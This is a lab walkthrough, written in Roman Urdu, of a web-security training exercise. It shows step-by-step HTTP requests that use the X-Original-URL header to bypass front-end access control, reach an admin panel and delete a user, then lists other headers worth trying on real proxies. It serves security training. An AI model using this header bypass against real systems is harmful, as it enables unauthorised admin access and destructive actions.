# URL-based access control can be circumvented
(Summary):

Front-end par /admin path block hai. Lekin back-end framework X-Original-URL header ko support karta hai — is ka matlab hai hum header use karke real backend resource access kar sakte hain.

### ✅ Step-by-Step Solution:

### 🧩 Step 1: Try /admin

Browser ya Burp ky url mein yeh add karo /admin 

❌ Blocked milega — yaani front-end ne rok diya.

admin panel bhi nhi chale ga ACCESS DENIED

### 🧪 Step 2: Request ko Repeater mein bhejo
Burp Repeater open karo aur GET request bhejo:

**GET / HTTP/1.1**

**Host: your-lab-id.web-security-academy.net**

**X-Original-URL: /invalid**

👀 Agar response 404 Not Found aye, iska matlab back-end ne X-Original-URL ko process kiya — bypass ka raasta mil gaya.

### 🛠️ Step 3: Real admin path try karo
Ab header mein X-Original-URL: /admin likho:

**GET / HTTP/1.1**

**Host: your-lab-id.web-security-academy.net**

**X-Original-URL: /admin**

✅ Admin panel mil gaya! 🎯

### 🧹 Step 4: Carlos ko delete karo
Ab delete endpoint use karo:

**GET /?username=carlos HTTP/1.1**

**Host: your-lab-id.web-security-academy.net**

**X-Original-URL: /admin/delete**

💣 Carlos delete ho gaya, lab complete!

## 🧠 Penetration Testing Tip:
Jab bhi tumhare samne koi frontend block ho URL par, to socho:

Kya backend koi alternative headers ko process karta hoga?

Common headers: X-Original-URL, X-Rewrite-URL, X-Forwarded-Path, X-Forwarded-For

Aise bypass real world mein load balancers aur reverse proxies ko dodge karne ke liye use hotay hain. Yeh technique bohot powerful hai agar backend mein misconfiguration ho.
